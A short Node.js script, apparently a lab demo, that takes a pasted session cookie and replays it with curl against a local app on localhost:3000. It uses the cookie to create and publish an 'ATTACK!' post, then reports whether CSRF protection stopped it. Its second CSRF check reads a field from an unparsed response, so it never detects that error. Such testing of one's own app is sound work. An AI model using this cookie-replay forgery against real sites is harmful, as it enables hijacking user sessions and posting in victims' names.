const readline = require('readline');
const {escape} = require("querystring");
const {spawn} = require("child_process");

const reader = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});


reader.question('Please Enter the CurrentUser cookie: ', (answer) => {
    let cookie = JSON.parse(answer);
    reader.close();
    const curlPostCommand = [
        'curl',
        '-X', 'POST',
        'http://localhost:3000/api/post',
        '-H', 'Content-Type: application/json',
        '-H', `Cookie: CurrentUser=${JSON.stringify(cookie)}`,
        '-d', `{"title": "ATTACK!","content": "The site was attacked!","email":"${cookie.user.email}","currentUser": ${JSON.stringify(cookie)}}`
    ];
    console.log('Trying to attack... Create new post in the user drafts...');
    const curlPostProcess = spawn(curlPostCommand[0], curlPostCommand.slice(1));
    curlPostProcess.stdout.on('data', (response) => {
        console.log('Response from server:', response.toString());
        let res = JSON.parse(response.toString());
        if (res.message === 'Invalid CSRF token') {
            console.log("Failed to attack due to CSRF Protection :(");
        } else {
            console.log("New post was created successfully!");
            console.log("Continue with the attack...");
            console.log("Publish the new post in the public feed...");
            const curlPublishCommand = [
                'curl',
                '-X', 'POST',
                `http://localhost:3000/api/publish/${res.id}`,
                '-H', 'Content-Type: application/json',
                '-H', `Cookie: CurrentUser=${JSON.stringify(cookie)}`,
            ];

            const curlPublishProcess = spawn(curlPublishCommand[0], curlPublishCommand.slice(1));
            curlPublishProcess.stdout.on('data', (response) => {
                console.log('Response from server:', response.toString());
                if (response.message === 'Invalid CSRF token') {
                    console.log("Failed to attack due to CSRF Protection :(");
                } else {
                    console.log("The new post was published!");
                    console.log("ATTACK COMPLETED SUCCESSFULLY!");
                }
            });
        }
    });
});
